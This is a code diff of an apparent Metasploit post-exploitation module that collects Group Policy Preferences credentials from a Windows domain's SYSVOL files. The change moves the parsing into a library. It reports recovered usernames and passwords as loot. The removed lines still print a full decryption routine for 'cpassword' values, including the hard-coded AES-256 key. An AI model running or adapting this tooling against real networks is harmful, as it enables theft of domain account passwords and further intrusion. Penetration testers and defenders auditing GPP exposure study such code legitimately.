@@ -6,8 +6,7 @@
 ##
 
 require 'msf/core'
-require 'rex'
-require 'rexml/document'
+require 'rex/parser/group_policy_preferences'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/priv'
 require 'msf/core/auxiliary/report'
@@ -199,7 +198,7 @@ class Metasploit3 < Msf::Post
       retobj = {
         :dc     => spath[2],
         :path   => path,
-        :xml    => REXML::Document.new(data).root
+        :xml    => data
       }
       if spath[4] == "sysvol"
         retobj[:domain] = spath[5]
@@ -216,75 +215,22 @@ class Metasploit3 < Msf::Post
   def parse_xml(xmlfile)
     mxml = xmlfile[:xml]
     print_status "Parsing file: #{xmlfile[:path]} ..."
-    filetype = xmlfile[:path].split('\\').last()
-    mxml.elements.to_a("//Properties").each do |node|
-      epassword = node.attributes['cpassword']
-      next if epassword.to_s.empty?
-      pass = decrypt(epassword)
+    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
+    results = Rex::Parser::GPP.parse(mxml)
 
-      user = node.attributes['runAs'] if node.attributes['runAs']
-      user = node.attributes['accountName'] if node.attributes['accountName']
-      user = node.attributes['username'] if node.attributes['username']
-      user = node.attributes['userName'] if node.attributes['userName']
-      user = node.attributes['newName'] unless node.attributes['newName'].blank?
-      changed = node.parent.attributes['changed']
+    tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
 
-      # Printers and Shares
-      path = node.attributes['path']
+    tables.each do |table|
+      table.print
+    end
 
-      # Datasources
-      dsn = node.attributes['dsn']
-      driver = node.attributes['driver']
-
-      # Tasks
-      app_name = node.attributes['appName']
-
-      # Services
-      service = node.attributes['serviceName']
-
-      # Groups
-      expires = node.attributes['expires']
-      never_expires = node.attributes['neverExpires']
-      disabled = node.attributes['acctDisabled']
-
-      table = Rex::Ui::Text::Table.new(
-        'Header'     => 'Group Policy Credential Info',
-        'Indent'     => 1,
-        'SortIndex'  => -1,
-        'Columns'    =>
-        [
-          'Name',
-          'Value',
-        ]
-      )
-
-      table << ["TYPE", filetype]
-      table << ["USERNAME", user]
-      table << ["PASSWORD", pass]
-      table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
-      table << ["DOMAIN", xmlfile[:domain] ]
-      table << ["CHANGED", changed]
-      table << ["EXPIRES", expires] unless expires.blank?
-      table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
-      table << ["DISABLED", disabled] unless disabled.blank?
-      table << ["PATH", path] unless path.blank?
-      table << ["DATASOURCE", dsn] unless dsn.blank?
-      table << ["DRIVER", driver] unless driver.blank?
-      table << ["TASK", app_name] unless app_name.blank?
-      table << ["SERVICE", service] unless service.blank?
-
-      node.elements.each('//Attributes//Attribute') do |dsn_attribute|
-        table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
-      end
-
-      print_good table.to_s
-
+    results.each do |result|
       if datastore['STORE']
         stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
         print_status("XML file saved to: #{stored_path}")
       end
 
-      report_creds(user,pass) unless disabled and disabled == '1'
+      report_creds(result[:USER],result[:PASS]) unless result[:DISABLED] and result[:DISABLED] == '1'
     end
   end
 
@@ -304,22 +250,6 @@ class Metasploit3 < Msf::Post
       :source_type => "exploit",
       :user => user,
       :pass => pass)
-  end
-
-  def decrypt(encrypted_data)
-    padding = "=" * (4 - (encrypted_data.length % 4))
-    epassword = "#{encrypted_data}#{padding}"
-    decoded = Rex::Text.decode_base64(epassword)
-
-    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
-    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
-    aes.decrypt
-    aes.key = key
-    plaintext = aes.update(decoded)
-    plaintext << aes.final
-    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
-
-    return pass
   end
 
   def enum_domains
